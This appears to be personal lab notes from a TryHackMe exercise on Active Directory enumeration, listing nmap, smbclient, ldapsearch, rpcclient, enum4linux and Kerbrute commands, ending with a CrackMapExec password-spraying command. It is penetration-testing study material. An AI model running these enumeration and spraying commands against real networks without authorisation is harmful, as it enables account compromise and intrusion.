# AD basic enumeration

## Host Discovery

### fping
fping is just like ping but we can specify more hosts

<pre> fping -agq 10.211.11.0/24</pre> 


`-a:` shows systems that are alive. <br>
`-g:` generates a target list from a supplied IP netmask.<br>
`-q:` quiet mode, doesn't show per-probe results or ICMP error messages.<br>

Or we can use nmap

<pre>nmap -sn 10.211.11.0/24</pre>

`-sn` ping scan

Once we have them we can add them to a `hosts.txt` file for easier manipulation.

<pre> fping -agq 10.211.11.0/24 > hosts.txt</pre> 

Than we can run full port scan

<pre> nmap -p- -sV -sC -T4 -iL hosts.txt -oN full_port_scan.txt </pre>

## SMB enumeration
port 445
<pre> smbclient -L //TARGET_IP -N </pre>

To see which shares grant acces use nmap
<pre>nmap -p445 --script smb-enum-shares 10.211.11.10</pre>

Accesing the files
<pre>smbclient //10.211.11.10/SharedFiles -N</pre>

If it requeries cred use `--user=USERNAME --password=PASSWORD` instead of `-N`

## Domain Enumeration

### LDAP Enumeration

We can test if anonymous LDAP bind is enabled
<pre> ldapsearch -x -H ldap://10.211.11.10 -s base</pre>

<pre>
...
defaultNamingContext: DC=tryhackme,DC=loc
...
</pre>

<pre> ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"</pre>

### enum4linux
automatic enumeration tool

<pre> enum4linux -A 10.211.11.10 -oA results.txt </pre>

### RPC Enumeration

<pre> rpcclient -U "" 10.211.11.10 -N </pre>


once in use `enumdomusers`

or more
<pre>for i in $(seq 500 2000); do echo "queryuser $i" |rpcclient -U "" -N 10.211.11.10 2>/dev/null | grep -i "User Name"; done</pre>

to make just usernames

<pre>cat yourfile.txt | awk -F':' '{gsub(/^[ \t]+/, "", $2); print $2}' > usernames.txt
</pre>
Kerbrute performs brute-force username enumeration against Kerberos:
<pre> kerbrute userenum --dc 10.211.11.10 -d tryhackme.loc users.txt</pre>

## Password spraying

    In rpcclient: password_properties: 0x00000001
    With CrackMapExec: Password Complexity Flags: 000001

Use attack box or kali linux for this one

Check if it is possible

<pre> rpcclient -U "" 10.211.11.10 -N</pre>

run `getdompwinfo`
<pre>min_password_length: 7
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
</pre>

Get password policy
<pre> crackmapexec smb 10.211.11.10 --pass-pol </pre>

Password spraying attack
<pre> crackmapexec smb 10.211.11.20 -u users.txt -p passwords.txt </pre>
